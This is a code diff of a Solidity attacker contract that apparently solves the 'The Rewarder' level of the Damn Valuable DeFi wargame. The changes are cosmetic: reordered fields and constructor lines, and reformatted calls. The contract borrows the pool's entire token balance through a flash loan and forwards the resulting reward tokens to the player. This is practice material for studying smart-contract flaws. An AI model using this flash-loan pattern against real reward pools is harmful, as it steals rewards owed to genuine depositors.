@@ -8,18 +8,18 @@ import "../DamnValuableToken.sol";
 
 contract TheRewarderAttacker {
 
+    address public immutable player;
     TheRewarderPool public immutable rewarderPool;
     FlashLoanerPool public immutable loanerPool;
     DamnValuableToken public immutable liquidityToken;
     RewardToken public immutable rewardToken;
-    address public immutable player;
 
     constructor(address _rewarderPool, address _loanerPool) {
+        player = msg.sender;
         rewarderPool = TheRewarderPool(_rewarderPool);
+        loanerPool = FlashLoanerPool(_loanerPool);
         liquidityToken =  DamnValuableToken(rewarderPool.liquidityToken());
         rewardToken = RewardToken(rewarderPool.rewardToken());
-        loanerPool = FlashLoanerPool(_loanerPool);
-        player = msg.sender;
     }
 
     function receiveFlashLoan(uint256 amount) external {
@@ -30,7 +30,12 @@ contract TheRewarderAttacker {
     }
 
     function attack() external {
-        loanerPool.flashLoan(liquidityToken.balanceOf(address(loanerPool)));
-        rewardToken.transfer(player, rewardToken.balanceOf(address(this)));
+        loanerPool.flashLoan(
+            liquidityToken.balanceOf(address(loanerPool))
+        );
+        rewardToken.transfer(
+            player, 
+            rewardToken.balanceOf(address(this))
+        );
     }
 }
